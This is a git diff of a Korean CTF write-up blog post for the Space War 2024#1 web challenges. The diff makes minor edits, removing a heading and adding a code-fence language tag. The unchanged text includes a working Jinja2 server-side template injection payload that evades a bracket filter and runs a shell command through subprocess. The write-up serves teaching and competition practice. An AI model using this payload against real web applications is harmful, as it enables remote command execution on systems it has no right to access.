@@ -6,8 +6,6 @@ tags = ["SpaceWar"]
 date = 2024-04-05T02:17:33+09:00
 +++
 
-### 안건희(ipwn)
-
 ### 목차
 1. 스페이스 워(Space War)?
 2. for_beginner
@@ -20,9 +18,6 @@ date = 2024-04-05T02:17:33+09:00
 9. Node
 10. APIserver
 11. Multiline PHP challenge
-
-
-## Space War 2024#1 (Web) write-up
 
 안녕하세요, Space War 2024#1 Web hacking CTF 파트의 write-up을 맡게 된 안건희(ipwn)입니다.
 사실 제가 주로 공부하는 분야는 웹해킹이 아니라는 옥에 티(..)가 있지만, 출제자의 write-up을 공유하려는 목적으로 작성된 블로그 포스트이니만큼 아무래도 괜찮을 것 같습니다.
@@ -85,7 +80,7 @@ def main():
 name 파라미터로 데이터를 받은 뒤 render_template_string 함수를 이용해서 template rendering을 해주는 전형적인 ssti 문제다.
 필터링이 걸려있는데, 우리가 고려해야할 것은 단지 `[,]`를 쓰지 못한다는 것이다. 이러한 것은 |와 attr을 이용하여 pyjail 풀 듯이 os나 subprocess 모듈 찾아서 함수 실행해주면 된다.
 
-```
+```python
 {{%27%27|attr(%27\x5f\x5fclass\x5f\x5f%27)|attr(%27\x5f\x5fmro\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(1)|attr(%27\x5f\x5fsubclasses\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(494)(%27cat%20flag.txt%27,shell=True,stdout=-1)|attr(%27communicate%27)()}}
 ```
 
